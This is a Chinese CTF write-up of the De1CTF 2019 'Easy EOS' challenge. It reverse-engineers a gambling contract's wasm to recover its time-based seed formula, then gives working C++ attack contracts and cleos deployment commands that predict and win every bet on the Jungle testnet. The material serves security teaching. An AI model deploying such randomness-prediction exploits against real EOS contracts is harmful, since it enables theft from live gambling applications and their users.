# Easy EOS from De1CTF2019

阅读量 **295564**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-08-14 14:30:04

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t0182019f6aa82a5b42.png)

> 逃得了初一是逃不过十五，终于在一次CTF中邂逅了 EOS 的相关题目

详细的题目描述可以参考已经发布的官方 wp

虽然说已经发布了 writeup，但由于其太过简练，没有接触的朋友们可能难以弄的很懂，由于我也是比赛后期通过部署链上公开的攻击代码得以get
flag的，这里就与大伙一起把这题弄得明白一点

稳重前面几部分都是写给没有接触过eos平台的读者的，若有一定基础则可以直接浏览后文🙏有疑惑的，都可以在文末留言

## 前期准备

有许多接触过区块链类型题目的伙伴都会发现，原来题目并不麻烦，但是搭环境太愁人。相比以太坊的 geth ，EOS平台下提供有官方终端的 cleos
和写app用的 eosjs 两者都不是很好入门，而且这两者只是一个接口应用，并非像 geth 已经提供了整套虚拟机，如果要正式的应付
eosio，大概是需要下面的套餐

![](https://p5.ssl.qhimg.com/t0146ebf22b8185f7c2.png)

简而言之，cleos提供一个接口，有这个接口我们就可以与其他区块链全节点进行交互

  1. 安装 cleos，这里可以参见官网，macos或者linux应该都较为方便，因为是做题，推荐直接安装pre-compiled的包而不是自己编译（亲测编译源码坑太多）
  2. 安装 cdt (contract development toolkit)，这一步是可选，cdt并非上图栈中的一部分，是用于开发eos合约的，因为现阶段也有线上的工具，大抵就和以太坊下的remix差不多，会用就好这里不赘述了
  3. 注册一个 [JUNGLE](https://jungletestnet.io/) 下的账户，参见官网流程即可，顺便到 facuet 领点 token 方便后续部署合约

## 观察目标合约

一般做以太坊的题目我会学我师父的用 [Etherscan](https://ropsten.etherscan.io/) 来初步探究，而 eos
下的区块链浏览器相较于以太坊更加丰富了（因为eos平台的交易量早就超过以太坊了啊），这里推荐使用
[blocks.io](https://jungle.bloks.io/account/de1ctf111eos?loadContract=true&tab=Tables&account=de1ctf111eos&scope=de1ctf111eos&limit=100&table=users)
功能较全也比较好看

已知目标合约

  * 合约用户名为 de1ctf111eos （这里啰嗦一下，EOS平台下一个用户和一个合约是一一对应的，不像以太坊里面有外部账户这种说法
  * 合约环境 Jungle Testnet 2.0

目标：You need to win at least 10 times，而且中途一旦输一次这个账户就不能接着玩了

我们从区块链浏览器里扒下这些信息

(1) 合约的外部函数

![](https://p4.ssl.qhimg.com/t01425ec208938d9e2b.png)

可以看到这里有 bet 和 sendmail
两个函数（同时大家也看到了可以在这里直接进行交易的提交，但由于我这里网速实在不好，一直弄不好scatter钱包所以没尝试，大家或许可以玩玩）

(2) 合约的数据表

![](https://p1.ssl.qhimg.com/t01c44ba0f0e0eb8b47.png)

可以看到这里有三个 table，简单查看一下内容，或者

  * mails表存放已经成功get flag对象及其邮箱
  * seed表，如其名，应该是存放这生成随机数用的种子
  * users表，存放了所有参与玩家的胜/败场次

信息收集大概够了，接下来我们介绍也就是官方给出的两种思路，随机数攻击和回滚攻击，本篇文章我们单介绍随机数破译

## 随机数攻击

既然是赌博游戏而且要求不输，自然就是“出老千”，如果能够逆向合约预判每一次的结果，那就可以战无不胜了。

做合约逆向前可以先学习一下这几篇博客

(1) [wasm汇编入门](https://developer.mozilla.org/zh-CN/docs/WebAssembly/Understanding_the_text_format)

(2) [静态逆向 wasm 的一些基础](https://xz.aliyun.com/t/5170)

(3) [合约逆向初探](https://www.bunnypub.net/zh-cn/water/topics/98321)（注意其中的 name
转化脚本可以学习）

另外可以用的工具的话好像网上有提供 idawasm 插件，radare2，和 jeb，不过这里我就只是使用 VS Code
来纯人工逆向了（工具集现在都没有很成型）

首先我们通过 apply 函数以及 execute 函数定位到外部函数 bet 的代码主体（部分）

    
    
      (func $f64 (type $t23) (param $p0 i32) (param $p1 i64) (param $p2 i32)
        (local $l0 i32) (local $l1 i32) (local $l2 i32) (local $l3 i32) (local $l4 i32) (local $l5 i32) (local $l6 i32)
        get_global $g0
        i32.const 32
        i32.sub
        tee_local $l0
        set_global $g0
        get_local $l0
        get_local $p1
        i64.store offset=24
        get_local $p1
        call $env.require_auth
        get_local $p0
        i32.const 5
        call $f66       ;; update seed and get bet
        set_local $l1
        get_local $p0
    .........( 省略 N 行 ）.........
        block $B7
          get_local $l1
          get_local $p2
          i32.ne        ;; seed compare
          br_if $B7
          get_local $l0
          get_local $l0
          i32.const 16
          i32.add
          i32.store offset=8
    ..............................
          get_local $l2
          get_local $l5
          get_local $p1
          get_local $l0
          i32.const 8
          i32.add
          call $f69
          get_local $l0
          i32.const 32
          i32.add
          set_global $g0
          return
        end
        get_local $l2
        get_local $l5
        get_local $p1
        get_local $l0
        i32.const 8
        i32.add
        call $f70
        get_local $l0
        i32.const 32
        i32.add
        set_global $g0)
    

观察代码后如果能基本逆向浓缩到这一步，基本快要接近成功了；（wast栈代码实在是非常啰嗦，就上下滑就已经十分辛苦了，这里没有代码高亮的支持大家就凑合的看好了）

从头往下看到的第一个函数调用即 call $f66
是一个关键函数，跟进后可以发现其函数内完成了新一轮随机种子计算并返回了一个结果，大概率该结果就是猜测的值了）

让我们比较细心的看一看这个 $f66

    
    
     (func $f66 (type $t4) (param $p0 i32) (param $p1 i32) (result i32)
        (local $l0 i32) (local $l1 i32) (local $l2 i32) (local $l3 i64)
    ..............................
        block $B0
          block $B1
            get_local $p0
            i64.load offset=72            ;; memory{p0 + 72}
            get_local $p0
            i32.const 80
            i32.add
            i64.load                          ;; memory{p0 + 80} 
            i64.const -4425754204123955200   ;; name{seed} 这里查 seed 作为表名
            i64.const 0                      ;; key 键值
            call $env.db_lowerbound_i64      ;; 返回 seed 表的  <=== (1)
            tee_local $l2
            i32.const 0
            i32.lt_s
            br_if $B1
            get_local $l1
            get_local $l2
            call $f79                        ;; <=== (2)  
            set_local $l2
            br $B0
          end
          get_local $l0
          i32.const 8
          i32.add
          get_local $l1
          get_local $p0
          i64.load
          get_local $l0
          call $f80                          ;; <=== (3)
          get_local $l0
          i32.load offset=12
          set_local $l2
        end
        get_local $l0                        ;; *
        get_local $l2                        ;; *
        i32.load offset=8                  ;; *
        call $f62                              ;; <=== (4) *
        i64.const 1000000                ;; *
        i64.div_s                              ;; *
        i32.wrap/i64                        ;; *
        i32.add                               ;; *
        i32.const 65537                   ;; *
        i32.rem_u                           ;; *
        i32.store offset=8                ;; *
        get_local $p0                        
        i64.load                             
        set_local $l3
        get_local $l0
        get_local $l0
        i32.const 8
        i32.add
        i32.store
        block $B2
          get_local $l2
          br_if $B2
          i32.const 0
          i32.const 8352
          call $env.eosio_assert
        end
        get_local $l1
        get_local $l2
        get_local $l3
        get_local $l0
        call $f81                            ;; <=== (5)                       
        get_local $l0
        i32.load offset=8
        set_local $p0
        get_local $l0
        i32.const 16
        i32.add
        set_global $g0
        get_local $p0
        get_local $p1
        i32.rem_u)
    

可以发现，该f66中存在有比较重要的 5 处 call （记于注释处）

我们一个一个地解释，

  1. 这里有一个外部函数的调用 $env.db_lowerbound_i64 相当于是获得一个 iterator，这里通过name发现是seed表，基本确定是拿到种子的值；
  2. 跟进逻辑我们可知当上一步取得的迭代器非负时，通过调用 $f79 从迭代器中取得具体的值，这一步函数跟下去比较麻烦了，算是一种假设
  3. 而迭代器为负即seed表为空的时候， 通过 $f80 初始化该表
  4. $f62 内部调用了 $env.current_time，通过查看wp以及测试和分析这个函数调用后的除 1000000 我们得知这里应该是调用 API current_time_point().sec_since_epoch() 即获取微秒时间戳后转化为秒

结合起来我们便可以推理得到新的 seed 的计算方法为 （记于注释 * 处）

`new_seed = (old_seed + current_time) % prime`

其中 prime 便是汇编中的 65537，最后的细节就是函数返回处有个 i32.rem_u，这里是对 5
取余数（5是调用时候传入的参数$p1)，所以比赛hint中告知了范围是 0 — 4

  1. 简单跟进我们就可以发现最后调用的 $f81 中含有 $env.db_update_i64 ，应该就是将计算的新 seed 保存回表中了

破译由C++编写并以wasm呈现的合约难度还是相当大的，比赛过程中我并没有采取该方式，在赛后借助官方 writeup
才一步步剖析的代码，不过相信不远的将来，针对 EOS 逆向的利器也将问世，只不过在那之前，逆向合约多少有点辛苦就是了

## 编写攻击合约

写 eos 下的合约有好也有不好，首先基于 C++ 这让多数程序员感到会轻松，毕竟算比较大众的语言了；但是由于 EOS 本身相较于 以太坊
就要复杂不少，其合约编写中需要注意的如接口、权限以及等等相对来说要麻烦很多，再继续往下读之前，我建议读者有时间把官网中相关的 [Get
Start](https://developers.eos.io/eosio-home/docs) 篇章给过一遍，把基础打扎实

至少进行下一步之前，你需要明白了解如何在命令行中打开wallet，如何导入在 JUNGLE 中创建账户用的密钥以及基本的操作，这些操作请自行 google

我先给出标准（稍微简化）的答案一，注意以下测试都是针对测试合约 de1ctftest11 进行的

    
    
    #include <eosio/eosio.hpp>
    #include <eosio/system.hpp>
    #define TARGET_ACCOUNT "de1ctftest11"
    using namespace eosio;
    
    class [[eosio::contract]] attack : public contract {
      private:
    
        int random(int oldseed, const int range){
          // Generate new seed value using the existing seed value
          int prime = 65537;
          auto new_seed_value = (oldseed + (uint32_t)(eosio::current_time_point().sec_since_epoch())) % prime;
    
          // Get the random result in desired range
          int random_result = new_seed_value % range;
          return random_result;
        }
    
      public:
        using contract::contract;
        attack( name receiver, name code, datastream<const char*> ds ):contract(receiver, code, ds){}
    
        [[eosio::action]]
        void makebet(int oldseed)
        {
          // Ensure this action is authorized by the player
          require_auth(get_self());
          int random_num = random(oldseed, 5);
          print("make bet ", random_num);
    
          action(
            permission_level{get_self(),"active"_n},  //所需要的权限结构
            name(TARGET_ACCOUNT),                          // 调用的合约名称
            "bet"_n,                              // 合约的方法
            std::make_tuple(get_self(), random_num) // 传递的参数
          ).send();
        }
    };
    

编译合约、抵押 RAM、部署合约、调整合约 eosio.code
权限等过程限于篇幅这里省略，建议大家在官网上学习并自行google，我这里就简单给命令介绍了

    
    
    # 编译 attack.cpp 获得 attack.wasm 以及 attack.abi
    eosio-cpp attack.cpp 
    # 抵押 RAM
    cleos -u http://jungle2.cryptolions.io:80 system buyram aaatester123 aaatester123 "10.0000 EOS" 
    # 部署合约，这里使用 -u 指定一个全节点就不需要自己跑链了
    cleos -u http://jungle2.cryptolions.io:80 set contract aaatester123 ./attack
    # 调整 eosio.code 权限
    cleos -u http://jungle2.cryptolions.io:80 set account permission aaatester123 active  
    '{"threshold" : 1, "keys" : [{"key":"你选的EOS公钥","weight":1}], 
    "accounts" : [{"permission":{"actor":"aaatester123","permission":"eosio.code"},"weight":1}]}' owner  
    -p aaatester123@owner
    

如果你以及通过了官网上的初步测试，则应该已经了解了 EOS 合约下的结构，这里我重复介绍以下

    
    
    #include <eosio/eosio.hpp>   // 核心库函数
    using namespace eosio;
    class [[eosio::contract]] attack : public contract {
    public:
        [[eosio::action]]
        {...}
    }
    

这里在 public 关键字下由 [[eosio::action]] 作为标记的函数就是对外暴露可调用的函数，类似于以太坊下的 public
function；我们看这个攻击合约内有唯一的可调用函数 makebet，其接收一个 int 类型的参数，即目标合约现有的 seed
值，我们一样可以在区块链浏览器上找到该值

![](https://p5.ssl.qhimg.com/t01045dc9a9210e25ce.png)

函数的功能还是很显而易见的，就是基于传入的 oldseed 计算新的 seed 并向目标合约发交易，稍微要啰嗦的就是 EOS 中合约发送 inline
交易的代码要写成这样，相比 以太坊 中的 send 和 call 还是麻烦了很多，可以参考官网部分

    
    
    action(
            //permission_level,
            //code,
            //action,
            //data
          ).send();
    

其中参数啥的还是自己取搜清楚把；接下来我们调用部署的合约；

    
    
    # 已知现在的 seed value 为 45587，那么传入参数为 45587
    cleos -u http://jungle2.cryptolions.io:80 push action aaatester123 makebet '{"oldseed":45587}' -p aaatester123@active
    # 返回
    # executed transaction: f672ad16a8f40d9f96a56b2eaabd4b719e2ae4c66aed0a9bf5bae8e9fc481219  96 bytes  206 us
    #  aaatester123 <= aaatester123::makebet        {"oldseed":45587}
    # >> make bet 0
    #  de1ctftest11 <= de1ctftest11::bet            {"username":"aaatester123","num":0}
    

查看合约的 users 表发现我们成功得到了 win，这样子重复 10 次我们就可以稳稳当当的获取 10 次胜利！

当然，上面给出的是简化版本的攻击合约，标准的合约如下

    
    
    #include <eosio/eosio.hpp>
    #include <eosio/system.hpp>
    #define TARGET_ACCOUNT "de1ctftest11"
    using namespace eosio;
    
    class [[eosio::contract]] attack : public contract {
      private:
    
        struct [[eosio::table]] seed {
          uint64_t        key = 1;
          uint32_t        value = 1;
    
          auto primary_key() const { return key; }
        };
    
        typedef eosio::multi_index<name("seed"), seed> seed_table;
    
        seed_table _seed;
    
        int random(const int range){
          // Find the existing seed
          auto seed_iterator = _seed.begin();
    
          // Initialize the seed with default value if it is not found
          if (seed_iterator == _seed.end()) {
            seed_iterator = _seed.emplace( _self, [&]( auto& seed ) { });
          }
    
          // Generate new seed value using the existing seed value
          int prime = 65537;
          auto new_seed_value = (seed_iterator->value + (uint32_t)(eosio::current_time_point().sec_since_epoch())) % prime;
    
    
          // Get the random result in desired range
          int random_result = new_seed_value % range;
          return random_result;
        }
    
      public:
        using contract::contract;
        attack( name receiver, name code, datastream<const char*> ds ):contract(receiver, code, ds),
                           _seed(eosio::name(TARGET_ACCOUNT), eosio::name(TARGET_ACCOUNT).value) {}
    
        [[eosio::action]]
        void makebet()
        {
          // Ensure this action is authorized by the player
          require_auth(get_self());
          int random_num = random(5);
          print("make bet ", random_num);
    
          action(
            permission_level{get_self(),"active"_n},  //所需要的权限结构
            name(TARGET_ACCOUNT),                          // 调用的合约名称
            "bet"_n,                              // 合约的方法
            std::make_tuple(get_self(), random_num) // 传递的参数
          ).send();
        }
    };
    

该合约最大的不同是引入了 multi_index 表，简单来说就是直接在运行时查询 seed
的value而不用我们人工去查了，虽然显得复杂一些，但其原理还是比较简单，table等相关知识也在官网中有详细介绍，类似于以太坊中的 map 结构。

另外一种基于回滚攻击的方法我们放到另文介绍，感谢阅读😄

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **f0rm2l1n** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/183848](/post/id/183848)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [eos](/tag/eos)

 **+1** __6赞

 __收藏

![](https://p2.ssl.qhimg.com/t01dcea6a7cbb695bd2.png) f0rm2l1n

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

